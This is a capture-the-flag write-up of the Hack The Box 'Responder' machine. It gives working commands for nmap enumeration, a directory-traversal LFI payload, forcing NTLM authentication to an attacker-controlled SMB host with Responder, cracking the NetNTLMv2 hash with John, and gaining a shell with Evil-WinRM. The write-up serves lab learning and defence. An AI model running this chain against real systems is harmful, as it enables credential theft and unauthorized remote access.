# Responder - HTB Write-up

> **Scope note:** This write-up documents an authorized Hack The Box lab.

## Summary

Responder is a Windows-focused machine that demonstrates how a **Local File Inclusion (LFI)** vulnerability can be chained with **SMB authentication** to capture a user's NetNTLMv2 challenge.

The attack works because the vulnerable PHP application allows us to control a file path through the `page` parameter. By supplying an SMB path pointing back to our Kali machine, the Windows server attempts to authenticate to our machine. Responder acts as a malicious SMB server and captures the resulting NetNTLMv2 challenge-response.

We then use John the Ripper to crack the captured NetNTLMv2 challenge, recover the Administrator password, and use Evil-WinRM to obtain a remote Windows session.

    -> Nmap enumeration
    -> Discover Apache HTTP and WinRM
    -> Discover unika.htb virtual host
    -> Add unika.htb to /etc/hosts
    -> Identify vulnerable page parameter
    -> Confirm Local File Inclusion
    -> Abuse LFI with SMB
    -> Responder captures NetNTLMv2
    -> Crack the challenge with John
    -> Recover Administrator password
    -> Connect using Evil-WinRM
    -> Retrieve flag

---

# Enumeration

## Nmap

We begin by scanning all TCP ports and attempting service/version detection:

    nmap -p- --min-rate 1000 -sV <TARGET_IP>

The scan reveals two open ports:

    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.52
    5985/tcp open  http    Microsoft HTTPAPI httpd 2.0

The target is identified as a Windows machine.

Port `80` is running Apache, while port `5985` is running **WinRM**, which is particularly interesting because valid Windows credentials may allow us to obtain a remote PowerShell session.

---

# Website Enumeration

## Virtual Host

Opening the target IP in Firefox causes the browser to redirect to:

    http://unika.htb

The target is therefore using **name-based virtual hosting**.

The web server uses the HTTP `Host` header to determine which website should be returned. Our Kali machine does not yet know how to resolve `unika.htb`, so we add an entry to `/etc/hosts`:

    echo "<TARGET_IP> unika.htb" | sudo tee -a /etc/hosts

We can now access:

    http://unika.htb

The website is a web-design business landing page.

---

# Finding the Vulnerability

## Language Selection

The site contains a language selection option.

Changing the language from English to French changes the URL and reveals the following parameter:

    http://unika.htb/index.php?page=french.html

The important part is:

    page=french.html

The application appears to use this parameter to decide which page should be included.

This makes it worth testing for **Local File Inclusion (LFI)**.

---

# Local File Inclusion

## Testing the page Parameter

LFI occurs when an application allows an attacker to control which local file is included without properly validating the supplied path.

A common technique is directory traversal using:

    ../

Because the target is a Windows machine, we can attempt to read a known Windows file:

    http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

The request succeeds and the contents of the Windows hosts file are returned.

This confirms that the `page` parameter is vulnerable to Local File Inclusion.

---

# Understanding the LFI

The vulnerability exists because the backend PHP application uses the `include()` function to load different language pages based on the `page` parameter.

Conceptually, the application is doing something similar to:

    include($_GET['page']);

Because the input is not properly sanitized, we can supply a path outside the intended website directory.

The important part is that this is a **Windows web server**, meaning it can potentially access network resources using SMB.

---

# NetNTLMv2 Capture

## Why SMB?

Instead of simply reading another local file, we can make the Windows server attempt to access a file hosted on our Kali machine.

We can specify an SMB resource using a UNC path such as:

    \\<KALI_IP>\share

When Windows accesses an SMB resource, it may automatically attempt NTLM authentication.

This gives us an opportunity to capture the authentication exchange.

---

# NTLM Authentication

NTLM uses a challenge-response process.

The basic process is:

    1. Client sends its username and domain.
    2. Server sends a random challenge.
    3. Client uses the user's password-derived NTLM material to calculate a response.
    4. The response is sent back to the server.
    5. The server compares the response with the expected value.

Responder abuses this process by acting as a malicious SMB server.

Responder sends the challenge, receives the encrypted response, and captures the **NetNTLMv2 challenge-response**.

The NetNTLMv2 value is not the user's password itself. Instead, it is a challenge-response value that can be attacked offline with a password wordlist.

---

# Responder

## Starting Responder

Responder is available by default on Kali Linux.

We start it on the HTB VPN interface:

    sudo python3 Responder.py -I tun0

Responder starts its listeners, including the SMB server, and waits for authentication attempts.

The important part is that Responder needs to be listening on the interface through which the target can reach our machine.

---

# Triggering the Authentication

With Responder listening, we manipulate the vulnerable `page` parameter so that the Windows server attempts to access an SMB resource on our Kali machine.

For example:

    http://unika.htb/?page=//<KALI_IP>/somefile

The target attempts to load the requested resource.

The browser may display an error because the file does not actually exist, but the important part has already happened: the Windows server attempted SMB authentication to our machine.

Responder captures the resulting NetNTLMv2 challenge-response.

---

# Captured NetNTLMv2

Responder displays the captured authentication information, including the username:

    Administrator

The captured object contains both the challenge and encrypted response.

We save the captured NetNTLMv2 value into a file called:

    hash.txt

---

# Hash Cracking

## John the Ripper

We can now attempt to recover the original password using John the Ripper and the RockYou wordlist.

    john -w=/usr/share/wordlists/rockyou.txt hash.txt

John automatically identifies the NetNTLMv2 format and tests passwords from the wordlist.

The correct password is recovered:

    badminton

The credentials are therefore:

    Username: Administrator
    Password: badminton

---

# WinRM

## Evil-WinRM

The target has WinRM exposed on port `5985`.

Since we now have valid Administrator credentials, we can use Evil-WinRM to establish a remote PowerShell session:

    evil-winrm -i <TARGET_IP> -u administrator -p badminton

A successful connection gives us a remote Windows shell:

    *Evil-WinRM* PS C:\Users\Administrator\Documents>

We now have remote access to the target.

---

# Retrieving the Flag

The flag is located at:

    C:\Users\mike\Desktop\flag.txt

We can navigate to the directory and display the file.

    cd C:\Users\mike\Desktop

    type flag.txt

The flag is displayed and the machine is complete.

---

# Attack Path

    Target
      |
      v
    Nmap
      |
      +----------------------+
      |                      |
      v                      v
    Apache :80           WinRM :5985
      |
      v
    unika.htb
      |
      v
    page=french.html
      |
      v
    Local File Inclusion
      |
      v
    SMB UNC Path
      |
      v
    Windows attempts NTLM authentication
      |
      v
    Responder
      |
      v
    NetNTLMv2 Capture
      |
      v
    John the Ripper
      |
      v
    Administrator : badminton
      |
      v
    Evil-WinRM
      |
      v
    Windows Shell
      |
      v
    C:\Users\mike\Desktop\flag.txt
      |
      v
    HTB Flag

---

# Key Takeaways

- Always begin with full service enumeration.
- HTTP virtual hosts may expose applications that are not immediately accessible through the IP address alone.
- The `/etc/hosts` file can be used to locally resolve HTB hostnames such as `unika.htb`.
- Parameters that control which file a web application loads should be tested for Local File Inclusion.
- LFI can sometimes be chained with other protocols rather than being limited to reading local files.
- Windows systems may attempt NTLM authentication when accessing SMB resources.
- Responder can act as a malicious SMB server and capture NetNTLMv2 challenge-response data.
- NetNTLMv2 can be attacked offline using password wordlists.
- Recovered Windows credentials can be used against exposed WinRM services.
- The complete attack chain was:

    LFI
      +
    SMB
      +
    NTLM authentication
      +
    NetNTLMv2 cracking
      +
    WinRM
      =
    Remote Windows access
